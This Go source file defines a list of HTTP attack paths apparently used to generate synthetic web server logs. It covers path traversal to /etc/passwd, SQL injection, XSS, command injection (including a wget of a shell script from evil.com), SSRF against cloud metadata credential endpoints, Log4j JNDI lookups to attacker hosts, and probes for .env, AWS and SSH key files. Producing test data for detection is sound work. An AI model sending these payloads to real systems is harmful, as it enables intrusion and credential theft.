package security

import "math/rand"

// AttackPaths contains common HTTP attack patterns used across web server log generators.
var AttackPaths = []string{
	// Directory traversal attacks
	"/../../etc/passwd",
	"/..%2f..%2f..%2fetc/passwd",
	"/....//....//....//etc/shadow",
	"/api/v1/files?path=../../../etc/passwd",
	"/download?file=....//....//....//etc/hosts",
	"/static/..%252f..%252f..%252fetc/passwd",

	// SQL injection attempts
	"/api/v1/users?id=1'%20OR%20'1'='1",
	"/api/v1/search?q=';DROP%20TABLE%20users;--",
	"/api/v1/login?user=admin'--&pass=x",
	"/api/v1/products?category=1%20UNION%20SELECT%20password%20FROM%20users",
	"/api/v1/orders?id=1;%20WAITFOR%20DELAY%20'00:00:10'",
	"/api/v1/accounts?name='+OR+1=1--",

	// XSS attempts
	"/search?q=<script>alert('xss')</script>",
	"/api/v1/comments?text=%3Cscript%3Edocument.location='http://evil.com/'%3C/script%3E",
	"/profile?name=<img%20src=x%20onerror=alert(1)>",
	"/api/v1/feedback?msg=<svg/onload=alert('XSS')>",

	// Command injection
	"/api/v1/ping?host=127.0.0.1;cat%20/etc/passwd",
	"/api/v1/backup?file=test|wget%20http://evil.com/shell.sh",
	"/cgi-bin/test.cgi?cmd=ls%20-la",
	"/api/v1/convert?url=http://evil.com/$(whoami)",

	// Scanner and reconnaissance
	"/admin",
	"/admin/login",
	"/wp-admin/",
	"/wp-login.php",
	"/phpmyadmin/",
	"/phpMyAdmin/",
	"/.env",
	"/.git/config",
	"/.git/HEAD",
	"/config.php",
	"/web.config",
	"/server-status",
	"/server-info",
	"/nginx_status",
	"/.aws/credentials",
	"/.ssh/id_rsa",
	"/backup.sql",
	"/dump.sql",
	"/database.sql",
	"/api/swagger.json",
	"/actuator/env",
	"/actuator/health",
	"/debug/pprof/",
	"/graphql",
	"/metrics",
	"/trace",

	// Authentication bypass attempts
	"/api/v1/admin?admin=true",
	"/api/v1/users?role=admin",
	"/api/internal/debug",
	"/api/v1/auth/bypass",

	// SSRF attempts
	"/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/",
	"/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	"/api/v1/proxy?target=http://localhost:6379/",
	"/api/v1/webhook?callback=http://internal-service:8080/admin",
	"/api/v1/image?src=file:///etc/passwd",
	"/api/v1/redirect?url=http://metadata.google.internal/computeMetadata/v1/",

	// Log4j/JNDI injection
	"/api/v1/search?q=${jndi:ldap://evil.com/a}",
	"/api/v1/user-agent?ua=${jndi:rmi://attacker.com:1099/exploit}",
	"/${jndi:ldap://x.x.x.x/exploit}",

	// Shellshock
	"/cgi-bin/test.sh",
	"/cgi-bin/status",
	"/cgi-bin/bash",

	// Prototype pollution
	"/api/v1/settings?__proto__[admin]=true",
	"/api/v1/config?constructor[prototype][isAdmin]=true",

	// WebSocket hijacking probe
	"/ws/admin",
	"/socket.io/?transport=polling",
}

// RandomAttackPath returns a random attack path from the shared list.
func RandomAttackPath(r *rand.Rand) string {
	return AttackPaths[r.Intn(len(AttackPaths))] // #nosec G404
}
